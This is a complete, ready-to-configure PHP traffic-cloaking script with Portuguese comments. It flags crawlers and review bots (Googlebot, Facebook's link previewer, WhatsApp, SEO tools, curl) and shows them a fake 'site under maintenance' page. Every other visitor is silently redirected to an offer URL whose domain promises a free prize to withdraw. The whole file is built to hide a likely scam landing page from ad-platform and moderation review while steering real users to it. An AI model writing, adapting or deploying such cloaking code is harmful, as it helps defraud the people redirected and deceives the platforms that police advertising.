<?php
// ====================== CONFIGURAÇÕES (edite aqui se quiser mudar) ======================
$allowed_countries   = [];            // [] = libera todos os países
$require_mobile      = false;         // false = libera mobile + desktop
$offer_url           = 'https://retireseupremiolivre.site/vsl/'; // link final
$white_message       = 'Site em manutenção. Tente novamente em alguns instantes.'; // texto da página bloqueada

// Referrers permitidos (vazio = libera todos)
$allowed_referrer_patterns = [];
// ==================================================================================

// Pega IP real (funciona mesmo com proxy/Cloudflare)
function get_real_ip() {
    $headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
    foreach ($headers as $h) {
        if (!empty($_SERVER[$h])) {
            return trim(explode(',', $_SERVER[$h])[0]);
        }
    }
    return '127.0.0.1';
}

// GeoIP leve com cache de 1 hora (usa ip-api.com - gratuito e confiável)
function get_country_code($ip) {
    $cache_file = 'geo_cache.json';
    $cache = file_exists($cache_file) ? json_decode(@file_get_contents($cache_file), true) : [];

    if (isset($cache[$ip]) && (time() - $cache[$ip]['time']) < 3600) {
        return $cache[$ip]['country'];
    }

    $url = "http://ip-api.com/json/{$ip}?fields=countryCode";
    $response = false;

    // Tenta curl primeiro (mais estável na Hostinger)
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
        $response = curl_exec($ch);
        curl_close($ch);
    }
    if (!$response) {
        $response = @file_get_contents($url);
    }

    $country = 'XX';
    if ($response) {
        $data = json_decode($response, true);
        $country = $data['countryCode'] ?? 'XX';
    }

    $cache[$ip] = ['country' => $country, 'time' => time()];
    if (count($cache) > 1000) $cache = array_slice($cache, -500, 500, true);
    @file_put_contents($cache_file, json_encode($cache));

    return $country;
}

// Detecção leve de mobile (sem biblioteca externa)
function is_mobile_device() {
    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    if (empty($ua)) return false;
    $mobile = ['android','iphone','ipod','ipad','blackberry','windows phone','mobile','tablet','webos','opera mini','iemobile'];
    foreach ($mobile as $m) {
        if (strpos($ua, $m) !== false) return true;
    }
    return false;
}

// Detecção de bot
function is_bot() {
    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    if (empty($ua) || strlen($ua) < 15) return true;
    $bots = ['bot','crawl','spider','slurp','facebookexternalhit','whatsapp','googlebot','bingbot','ahrefs','semrush','mj12','python','curl','wget'];
    foreach ($bots as $b) {
        if (strpos($ua, $b) !== false) return true;
    }
    return false;
}

// Verifica referrer (array vazio = libera todos)
function is_allowed_referrer() {
    if (empty($GLOBALS['allowed_referrer_patterns'])) return true;
    $ref = strtolower($_SERVER['HTTP_REFERER'] ?? '');
    if (empty($ref)) return true;
    foreach ($GLOBALS['allowed_referrer_patterns'] as $p) {
        if (strpos($ref, $p) !== false) return true;
    }
    return false;
}

// ====================== EXECUÇÃO ======================
$ip         = get_real_ip();
$country    = get_country_code($ip);
$is_bot     = is_bot();
$is_mobile  = is_mobile_device();
$ref_ok     = is_allowed_referrer();
$country_ok = empty($allowed_countries) || in_array($country, $allowed_countries);

$liberado = !$is_bot && $country_ok && $ref_ok && ($require_mobile ? $is_mobile : true);

if ($liberado) {
    // Redireciona preservando 100% das UTMs e parâmetros
    $query = $_SERVER['QUERY_STRING'] ?? '';
    $url_final = $offer_url . (strpos($offer_url, '?') === false && $query ? '?' : '&') . $query;
    if (empty($query)) $url_final = $offer_url;
    header("Location: " . $url_final, true, 302);
    exit;
} else {
    // Página safe (branca e inofensiva)
    echo '<!DOCTYPE html><html lang="pt"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Carregando...</title><style>body{font-family:Arial,sans-serif;background:#f8f9fa;color:#333;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;text-align:center;}</style></head><body><h2>' . htmlspecialchars($white_message) . '</h2></body></html>';
    exit;
}
?>